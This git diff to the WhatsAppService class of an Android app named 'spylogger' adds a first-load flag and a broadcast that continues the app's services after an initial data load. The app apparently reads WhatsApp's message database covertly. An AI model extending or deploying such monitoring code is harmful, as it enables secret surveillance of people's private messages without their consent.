@@ -21,6 +21,7 @@ import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.model.whatsapp.Messages;
 import com.gravatasufoca.spylogger.receivers.Alarm;
+import com.gravatasufoca.spylogger.receivers.PrimeiraCarga;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.FcmMessageVO;
 import com.j256.ormlite.dao.Dao;
@@ -52,6 +53,7 @@ public class WhatsAppService extends Service {
     private DatabaseHelper dbHelper;
 
     private final IBinder mBinder = new LocalBinder();
+    private boolean primeiraVez;
 
     public class LocalBinder extends Binder {
         WhatsAppService getService() {
@@ -103,6 +105,10 @@ public class WhatsAppService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        if(intent!=null){
+            primeiraVez=intent.getBooleanExtra("primeiraVez",false);
+        }
+
         if ((new File(DatabaseHelperExternal.DATABASE_NAME)).exists()) {
             Log.d("WHATSLOG - FLAGS", Integer.toString(flags));
             Utils.context = getApplicationContext();
@@ -112,6 +118,8 @@ public class WhatsAppService extends Service {
                 setObserver();
 
             Log.d("WHATSLOG - OBSESRVER", Utils.whatsObserver.toString());
+        }else{
+            continuarServicos();
         }
         return START_REDELIVER_INTENT;
     }
@@ -296,8 +304,10 @@ public class WhatsAppService extends Service {
             }
             Log.i(this.getClass().getSimpleName(), "TERMINOU");
 
-            if (!mensagensComMidia.isEmpty() && mensagensComMidia.size()<10) {
+            if (!primeiraVez) {
                 verificaArquivos(mensagensComMidia,1);
+            }else{
+                continuarServicos();
             }
 
         } catch (SQLException e) {
@@ -310,6 +320,12 @@ public class WhatsAppService extends Service {
             } catch (IOException e) {
             }
         }
+    }
+
+    private void continuarServicos() {
+        Intent intent = new Intent(Utils.PRIMEIRA_CARGA);
+        intent.putExtra(PrimeiraCarga.MESSENGER,true);
+        sendBroadcast(intent);
     }
 
     private void verificaArquivos(List<Mensagem> mensagens, final int contador) {
